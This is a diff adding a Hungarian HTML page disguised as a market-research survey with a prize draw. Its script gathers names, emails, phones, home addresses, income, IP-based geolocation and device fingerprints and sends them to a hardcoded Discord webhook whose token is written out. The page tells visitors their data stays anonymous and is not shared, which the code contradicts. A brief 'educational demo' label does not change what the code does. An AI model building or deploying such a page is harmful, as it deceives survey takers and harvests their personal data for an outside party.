@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Piackutatási Felmérés - Véleménye Számít!</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --secondary: #4f46e5;
+            --accent: #7c3aed;
+            --light: #f8fafc;
+            --dark: #1e293b;
+            --gray: #64748b;
+            --success: #10b981;
+            --error: #ef4444;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            color: var(--dark);
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        header {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            font-size: 28px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin: 15px 0;
+            font-weight: 600;
+        }
+        
+        h2 {
+            font-size: 22px;
+            margin: 20px 0 15px;
+            color: var(--primary);
+        }
+        
+        h3 {
+            font-size: 18px;
+            margin: 15px 0 10px;
+            color: var(--secondary);
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 10px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .intro {
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .benefits {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .benefit-card {
+            flex: 1 1 200px;
+            background: var(--light);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .benefit-icon {
+            font-size: 24px;
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+        
+        form {
+            background: var(--light);
+            padding: 25px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .checkbox-group input {
+            width: auto;
+            margin-top: 4px;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            display: block;
+            text-align: center;
+        }
+        
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(37, 99, 235, 0.3);
+        }
+        
+        .btn:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .privacy {
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--gray);
+            text-align: center;
+        }
+        
+        .privacy a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--gray);
+            font-size: 14px;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .warning {
+            background: #fffbeb;
+            border: 1px solid #f59e0b;
+            color: #b45309;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            overflow: auto;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: white;
+            margin: 40px auto;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .close-modal {
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--gray);
+            background: none;
+            border: none;
+        }
+        
+        .terms-content {
+            height: 400px;
+            overflow-y: auto;
+            padding: 15px;
+            background: var(--light);
+            border-radius: 8px;
+            margin: 15px 0;
+            border: 1px solid #e2e8f0;
+            font-size: 14px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid var(--primary);
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid var(--success);
+            color: var(--success);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .error-message {
+            display: none;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--error);
+            color: var(--error);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        @media (max-width: 600px) {
+            .benefit-card {
+                flex: 1 1 100%;
+            }
+            
+            header {
+                padding: 20px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .modal-content {
+                padding: 20px;
+                margin: 20px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- ÁSZF elfogadás modális ablak -->
+    <div id="termsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Általános Szerződési Feltételek és Adatkezelési Tájékoztató</h2>
+                <button class="close-modal">&times;</button>
+            </div>
+            
+            <div class="terms-content">
+                <h3>1. Általános rendelkezések</h3>
+                <p>1.1. A jelen Általános Szerződési Feltételek (ÁSZF) a MarketInsight Research Kft. (a továbbiakban: Szolgáltató) és az oldal használója (a továbbiakban: Felhasználó) közötti jogviszonyt szabályozzák.</p>
+                <p>1.2. A weboldal használatával a Felhasználó elfogadja a jelen ÁSZF rendelkezéseit.</p>
+                
+                <h3>2. Szolgáltatások</h3>
+                <p>2.1. A Szolgáltató piackutatási felméréseket végez, melyekben a Felhasználó részt vehet.</p>
+                <p>2.2. A felmérésben való részvétel önkéntes, és a Felhasználó bármikor megszakíthatja.</p>
+                
+                <h3>3. Adatkezelés</h3>
+                <p>3.1. A Szolgáltató a Felhasználó által megadott személyes adatokat a felmérés keretében kezeli.</p>
+                <p>3.2. Az adatkezelés jogalapja a Felhasználó hozzájárulása.</p>
+                <p>3.3. Kezelt adatok: név, életkor, email cím, nem, lakóhely, telefonszám, vélemények, preferenciák.</p>
+                <p>3.4. Automatikusan gyűjtött adatok: IP-cím, böngésző típusa, operációs rendszer, eszköz információk, helymeghatározási adatok.</p>
+                <p>3.5. Az adatokat a Szolgáltató marketing és elemzési célokra használja fel.</p>
+                <p>3.6. Az adatokat a Szolgáltató partnereiivel megosztja a jobb szolgáltatásnyújtás érdekében.</p>
+                
+                <h3>4. Adatmegőrzés</h3>
+                <p>4.1. A Felhasználó személyes adatait a Szolgáltató a jelen feltételekben meghatározott célok megvalósulásához szükséges időtartamig, legfeljebb 5 évig őrzi meg.</p>
+                <p>4.2. A technikai adatokat (IP-cím, böngésző adatok) a Szolgáltató 2 évig őrzi meg.</p>
+                
+                <h3>5. Adattovábbítás</h3>
+                <p>5.1. A Szolgáltató az adatokat az Európai Gazdasági Térségen kívül is továbbíthatja.</p>
+                <p>5.2. Az adattovábbítás célja a jobb szolgáltatásnyújtás és a piackutatás.</p>
+                
+                <h3>6. Adatbiztonság</h3>
+                <p>6.1. A Szolgáltató megfelelő technikai és szervezési intézkedéseket tesz az adatok védelme érdekében.</p>
+                <p>6.2. A Szolgáltató nem vállal felelősséget az olyan adatvesztésért, amely a Felhasználó hibájából következik.</p>
+                
+                <h3>7. Cookie-k használata</h3>
+                <p>7.1. A Szolgáltató cookie-kat használ a weboldal működéséhez és a felhasználói élmény javításához.</p>
+                <p>7.2. A Felhasználó a böngésző beállításaival korlátozhatja a cookie-k használatát.</p>
+                
+                <h3>8. Szellemi tulajdon</h3>
+                <p>8.1. A weboldal minden tartalma a Szolgáltató szellemi tulajdona.</p>
+                <p>8.2. A tartalom másolása, terjesztése csak a Szolgáltató előzetes írásbeli hozzájárulásával megengedett.</p>
+                
+                <h3>9. Felelősség</h3>
+                <p>9.1. A Szolgáltató felelőssége minden esetben korlátozott.</p>
+                <p>9.2. A Szolgáltató nem vállal felelősséget az esetleges közvetett károkért.</p>
+                
+                <h3>10. Felhasználói tartalom</h3>
+                <p>10.1. A Felhasználó által beküldött tartalomra a Szolgáltató nem vállal felelősséget.</p>
+                <p>10.2. A Szolgáltató jogosult a Felhasználó által beküldött tartalmat moderálni és eltávolítani.</p>
+                
+                <h3>11. Szolgáltatás módosítása</h3>
+                <p>11.1. A Szolgáltató egyoldalúan módosíthatja a szolgáltatás feltételeit.</p>
+                <p>11.2. A módosításokról a Felhasználót a Szolgáltató értesíti.</p>
+                
+                <h3>12. Értesítések</h3>
+                <p>12.1. A Szolgáltató a Felhasználót emailben értesíti a fontos változásokról.</p>
+                <p>12.2. A Felhasználó felelőssége, hogy érvényes email címet adjon meg.</p>
+                
+                <h3>13. Jogorvoslat</h3>
+                <p>13.1. A Felhasználó panaszát a Szolgáltatónál teheti meg.</p>
+                <p>13.2. A panaszokra a Szolgáltató 30 napon belül válaszol.</p>
+                
+                <h3>14. Viták rendezése</h3>
+                <p>14.1. A Felek minden esetben törekedni fognak a viták egyeztetéssel történő rendezésére.</p>
+                <p>14.2. A vitákra magyar jog az irányadó.</p>
+                
+                <h3>15. Szerződésmódosítás</h3>
+                <p>15.1. A jelen ÁSZF módosítása a Szolgáltató részéről egyoldalúan lehetséges.</p>
+                <p>15.2. A módosítások a közzétételük után lépnek hatályba.</p>
+                
+                <h3>16. Érvénytelenség</h3>
+                <p>16.1. Ha a jelen ÁSZF egyes rendelkezései jogilag érvénytelenek, az nem érinti a szerződés többi részének érvényességét.</p>
+                
+                <h3>17. Erőviszonyok</h3>
+                <p>17.1. A Szolgáltatót nem kötelező erejű körülmények mentesítik a szerződési kötelezettségei alól.</p>
+                
+                <h3>18. Végleges rendelkezések</h3>
+                <p>18.1. A jelen ÁSZF a Felek között létrejött teljes megállapodást tartalmazza.</p>
+                
+                <h3>19. Hatályba lépés</h3>
+                <p>19.1. A jelen ÁSZF a Felhasználó által történő elfogadásával lép hatályba.</p>
+                
+                <h3>20. Adatvédelmi irányelvek</h3>
+                <p>20.1. A Szolgáltató GDPR-konform módon kezeli a Felhasználó adatait.</p>
+                <p>20.2. A Felhasználó hozzájárul, hogy adatait a jelen ÁSZF-ben foglaltak szerint kezeljék.</p>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="acceptTerms" name="acceptTerms">
+                <label for="acceptTerms">Elolvastam és megértettem az Általános Szerződési Feltételeket és az Adatkezelési Tájékoztatót. Elfogadom a feltételeket, és hozzájárulok személyes adatainak kezeléséhez a fentiek szerint.</label>
+            </div>
+            
+            <button id="acceptTermsBtn" class="btn" disabled>Elfogadás és továbblépés</button>
+        </div>
+    </div>
+
+    <!-- Fő tartalom -->
+    <div class="container" id="mainContent" style="display: none;">
+        <header>
+            <div class="logo">
+                <span class="logo-icon">📊</span>
+                <span>MarketInsight Research</span>
+            </div>
+            <h1>Segítsen nekünk a jövő termékeinek alakításában</h1>
+            <p class="subtitle">Véleménye számít! Szánjon nekünk 5 percet, és kapjon esélyt értékes nyereményekre!</p>
+        </header>
+        
+        <div class="content">
+            <div class="intro">
+                <p>Társaságunk a fogyasztói preferenciák feltérképezésével fejleszti termékeit és szolgáltatásait. Részvételével hozzájárulhat ahhoz, hogy a piac valóban igényei szerint alakuljon.</p>
+            </div>
+            
+            <div class="benefits">
+                <div class="benefit-card">
+                    <div class="benefit-icon">🎁</div>
+                    <h3>Nyereményjáték</h3>
+                    <p>Minden résztvevő automatikosan belép egy értékes nyereményjátékba</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="benefit-icon">📈</div>
+                    <h3>Piaci befolyás</h3>
+                    <p>Segítse a vállalatokat abban, hogy az Ön igényei szerint fejlesszenek</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="benefit-icon">🔒</div>
+                    <h3>Adatvédelem</h3>
+                    <p>Adatait kizárólag aggregált formában, anonimizálva használjuk fel</p>
+                </div>
+            </div>
+            
+            <form id="researchForm">
+                <div class="form-group">
+                    <label for="name">Teljes név</label>
+                    <input type="text" id="name" name="name" required placeholder="Kérjük, adja meg teljes nevét">
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email cím</label>
+                    <input type="email" id="email" name="email" required placeholder="email@pelda.hu">
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">Telefonszám</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="+36 20 123 4567">
+                </div>
+                
+                <div class="form-group">
+                    <label for="age">Életkor</label>
+                    <input type="number" id="age" name="age" min="18" max="99" required placeholder="18-99">
+                </div>
+                
+                <div class="form-group">
+                    <label for="gender">Nem</label>
+                    <select id="gender" name="gender" required>
+                        <option value="">Kérjük, válasszon</option>
+                        <option value="male">Férfi</option>
+                        <option value="female">Nő</option>
+                        <option value="other">Egyéb</option>
+                        <option value="prefer_not_to_say">Nem szeretném megadni</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="location">Lakóhely (város)</label>
+                    <input type="text" id="location" name="location" required placeholder="Budapest">
+                </div>
+                
+                <div class="form-group">
+                    <label for="address">Lakcím</label>
+                    <input type="text" id="address" name="address" placeholder="Kérjük, adja meg teljes lakcímét">
+                </div>
+                
+                <div class="form-group">
+                    <label for="income">Havi nettó jövedelem</label>
+                    <select id="income" name="income" required>
+                        <option value="">Kérjük, válasszon</option>
+                        <option value="under_100">100.000 Ft alatt</option>
+                        <option value="100-200">100.000 - 200.000 Ft</option>
+                        <option value="200-300">200.000 - 300.000 Ft</option>
+                        <option value="300-500">300.000 - 500.000 Ft</option>
+                        <option value="over_500">500.000 Ft felett</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="education">Legmagasabb iskolai végzettség</label>
+                    <select id="education" name="education" required>
+                        <option value="">Kérjük, válasszon</option>
+                        <option value="elementary">Általános iskola</option>
+                        <option value="highschool">Középiskola</option>
+                        <option value="bachelor">Felsőoktatás (BA/BSc)</option>
+                        <option value="master">Felsőoktatás (MA/MSc)</option>
+                        <option value="phd">Doktori (PhD)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="interests">Milyen termékek érdeklik Önt leginkább? (több is kiválasztható)</label>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="tech" name="interests" value="tech">
+                        <label for="tech">Technológiai termékek</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="fashion" name="interests" value="fashion">
+                        <label for="fashion">Divat és ruházat</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="home" name="interests" value="home">
+                        <label for="home">Lakáskultúra és háztartás</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="health" name="interests" value="health">
+                        <label for="health">Egészség és szépségápolás</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="sports" name="interests" value="sports">
+                        <label for="sports">Sport és szabadidő</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="finance" name="interests" value="finance">
+                        <label for="finance">Pénzügy és befektetés</label>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="feedback">Milyen termékek hiányoznak a piacról véleménye szerint?</label>
+                    <textarea id="feedback" name="feedback" rows="4" placeholder="Írja le véleményét..."></textarea>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="newsletter" name="newsletter" checked>
+                    <label for="newsletter">Szeretnék hírlevelet kapni a további kutatásokról és promóciókról</label>
+                </div>
+                
+                <div class="loading" id="formLoading">
+                    <div class="loading-spinner"></div>
+                    <p>Adatok küldése...</p>
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    ✅ Köszönjük, hogy kitöltötte kérdőívünket! Belépett a nyereményjátékba.
+                </div>
+                
+                <div class="error-message" id="errorMessage">
+                    ❌ Hiba történt az adatok küldése során. Kérjük, próbálja újra később.
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">Küldés és belépés a nyereményjátékba</button>
+                
+                <div class="privacy">
+                    <p>Az adatkezelési tájékoztatót <a href="#" id="showTerms">itt</a> olvashatja. Adatait bizalmasan kezeljük, és harmadik fél számára nem adjuk át.</p>
+                </div>
+            </form>
+            
+            <div class="warning">
+                <strong>Oktatási célú példa:</strong> Ez egy demonstrációs oldal, amely egy valódi marketing kutatási űrlapot modellez. Valós környezetben mindig tájékoztatnánk a felhasználókat az adatgyűjtés pontos céljáról, és kérnénk hozzájárulásukat.
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 MarketInsight Research Kft. | Minden jog fenntartva</p>
+        </footer>
+    </div>
+
+    <script>
+        // Discord Webhook URL - CSAK DEMÓ, VALÓS HASZNÁLATHOZ CSAK SAJÁT HOOKOT HASZNÁLJ
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1413606943729127504/l6JwTCzUXp-MWtF0d4kQqT6a_VBOhIm0tawPHy56gKFTifnUK-OpmuHIkaU7BuovCUb7";
+        
+        // DOM elemek
+        const termsModal = document.getElementById('termsModal');
+        const mainContent = document.getElementById('mainContent');
+        const acceptTerms = document.getElementById('acceptTerms');
+        const acceptTermsBtn = document.getElementById('acceptTermsBtn');
+        const closeModalBtn = document.querySelector('.close-modal');
+        const showTermsBtn = document.getElementById('showTerms');
+        const researchForm = document.getElementById('researchForm');
+        const formLoading = document.getElementById('formLoading');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        // IP cím és helymeghatározás
+        let userIP = "Ismeretlen";
+        let userLocation = "Ismeretlen";
+        
+        // Oldal betöltésekor megjelenítjük az ÁSZF-et
+        window.addEventListener('load', async () => {
+            termsModal.style.display = 'block';
+            
+            // IP cím lekérése
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Helyadatok lekérése az IP alapján
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+                
+                if (locationData && !locationData.error) {
+                    userLocation = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                }
+            } catch (error) {
+                console.error("Hiba történt az adatgyűjtés során:", error);
+            }
+        });
+        
+        // ÁSZF elfogadás gomb
+        acceptTerms.addEventListener('change', () => {
+            acceptTermsBtn.disabled = !acceptTerms.checked;
+        });
+        
+        acceptTermsBtn.addEventListener('click', () => {
+            termsModal.style.display = 'none';
+            mainContent.style.display = 'block';
+        });
+        
+        // Modal bezárása
+        closeModalBtn.addEventListener('click', () => {
+            termsModal.style.display = 'none';
+            mainContent.style.display = 'block';
+        });
+        
+        showTermsBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            termsModal.style.display = 'block';
+        });
+        
+        // Űrlap elküldése
+        researchForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Adatok gyűjtése
+            const formData = new FormData(researchForm);
+            const userData = {
+                name: formData.get('name'),
+                email: formData.get('email'),
+                phone: formData.get('phone'),
+                age: formData.get('age'),
+                gender: formData.get('gender'),
+                location: formData.get('location'),
+                address: formData.get('address'),
+                income: formData.get('income'),
+                education: formData.get('education'),
+                interests: formData.getAll('interests'),
+                feedback: formData.get('feedback'),
+                newsletter: formData.get('newsletter') === 'on',
+                ip: userIP,
+                geoLocation: userLocation,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                platform: navigator.platform,
+                deviceMemory: navigator.deviceMemory || "Ismeretlen",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Ismeretlen",
+                referrer: document.referrer || "Közvetlen megnyitás"
+            };
+            
+            // Küldés indítása
+            formLoading.style.display = 'block';
+            submitBtn.disabled = true;
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            
+            try {
+                // Discord webhook hívás
+                await sendToDiscord(userData);
+                
+                // Sikeres küldés
+                formLoading.style.display = 'none';
+                successMessage.style.display = 'block';
+                researchForm.reset();
+                
+                // 5 másodperc után eltüntetjük az üzenetet
+                setTimeout(() => {
+                    successMessage.style.display = 'none';
+                }, 5000);
+                
+            } catch (error) {
+                // Hiba esetén
+                console.error("Hiba történt:", error);
+                formLoading.style.display = 'none';
+                errorMessage.style.display = 'block';
+            } finally {
+                submitBtn.disabled = false;
+            }
+        });
+        
+        // Discord webhook küldése
+        async function sendToDiscord(data) {
+            // Formázott üzenet létrehozása
+            const message = {
+                username: "MarketInsight Research",
+                avatar_url: "https://example.com/logo.png",
+                embeds: [
+                    {
+                        title: "Új piackutatási válasz érkezett",
+                        color: 0x2563eb,
+                        fields: [
+                            {
+                                name: "Név",
+                                value: data.name || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Email",
+                                value: data.email || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Telefon",
+                                value: data.phone || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Életkor",
+                                value: data.age || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Nem",
+                                value: data.gender || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Lakóhely",
+                                value: data.location || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Lakcím",
+                                value: data.address || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Jövedelem",
+                                value: data.income || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Végzettség",
+                                value: data.education || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "IP cím",
+                                value: data.ip || "Nem megadva",
+                                inline: true
+                                                       },
+                            {
+                                name: "Fizikai hely",
+                                value: data.geoLocation || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Időzóna",
+                                value: data.timezone || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Nyelvek",
+                                value: data.language || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Képernyő felbontás",
+                                value: data.screenResolution || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Eszköz",
+                                value: data.platform || "Nem megadva",
+                                inline: true
+                            },
+                            {
+                                name: "Érdeklődési körök",
+                                value: data.interests.join(", ") || "Nem megadva",
+                                inline: false
+                            },
+                            {
+                                name: "Visszajelzés",
+                                value: data.feedback || "Nem megadva",
+                                inline: false
+                            },
+                            {
+                                name: "Hírlevél feliratkozás",
+                                value: data.newsletter ? "Igen" : "Nem",
+                                inline: true
+                            },
+                            {
+                                name: "Időbélyeg",
+                                value: new Date(data.timestamp).toLocaleString("hu-HU"),
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: `User Agent: ${data.userAgent.substring(0, 100)}...`
+                        }
+                    }
+                ]
+            };
+
+            // Webhook küldése
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            });
+
+            if (!response.ok) {
+                throw new Error(`Discord hiba: ${response.status}`);
+            }
+        }
+    </script>
+</body>
+</html>
